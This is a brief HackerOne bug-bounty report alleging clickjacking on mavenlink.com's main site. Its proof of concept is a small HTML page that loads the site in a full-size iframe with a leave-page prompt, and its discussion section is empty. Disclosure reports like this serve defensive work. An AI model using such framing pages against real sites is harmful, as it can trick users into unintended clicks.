# HackerOne Report: Clickjacking at https://www.mavenlink.com/ main website 
**Report ID:** 14631
**Vulnerability Class:** UI Redressing (Clickjacking)

## Vulnerability Information & PoC
Hello , i found clickjacking on main webpage.
<html><head>
<title> CSRF testing </title>
<style>

frame {

opacity: 0.5;
border: none;
position: absolute;
top: 0px;
left: 0px;
z-index: 1000;
}
</style>
</head>
<body>
<script>
   window.onbeforeunload = function()
   {
      return " Do you want to leave ?";
   }
</script>
<p> site is vulnerable for clickjacking! by Vineet bhardwaj</p>
<iframe id="frame" width="100%" height="100%" src="https://www.mavenlink.com/"></iframe>
</body>
</html>


same as last bug but its on other domain.... and its valid too 
waiting for positive response....
thanks 


## Discussion & Remediation Timeline
